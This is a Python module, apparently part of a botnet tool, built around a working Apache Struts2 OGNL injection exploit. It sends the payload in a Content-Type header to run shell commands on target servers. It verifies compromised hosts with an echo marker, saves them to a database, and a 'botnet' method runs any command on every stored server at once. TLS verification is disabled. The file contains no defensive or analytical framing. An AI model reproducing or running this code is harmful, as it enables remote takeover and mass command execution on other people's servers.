# -*- coding: utf-8 -*-

import os
import requests
from plugins.database import database
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class struts2:
    def total(self,):
        db = database()
        total = db(db.servers.id > 0).select()
        return len(total)

    def botnet(self,cmd):
        db = database()
        total = 0
        for server in db(db.servers.id > 0).select():
            if 'VERIFICA_SE_O_SERVIDOR_ESTA_ONLINE' in self.exploit(server.url,'echo "VERIFICA_SE_O_SERVIDOR_ESTA_ONLINE"'):
                self.exploit(server.url,cmd).strip()
                total += 1
        return total
         
    def add(self,url,):
        if 'VERIFICA_SE_O_SERVIDOR_ESTA_ONLINE' in self.exploit(url,'echo "VERIFICA_SE_O_SERVIDOR_ESTA_ONLINE"'):
            db = database()
            db.servers.insert(url=url)
            db.commit()
            return True
        else:
            return False

    def exploit(self,url,cmd):
        payload = "Content-Type:%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"
        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
            r = requests.get(url, headers=headers,verify=False,timeout=10)
            response = r.content
        except Exception as e:
            response = False
            erroLog = os.path.abspath(os.path.join('logs','error.log'))
            open(erroLog,'a').write(str(e)+'\n')
        return response
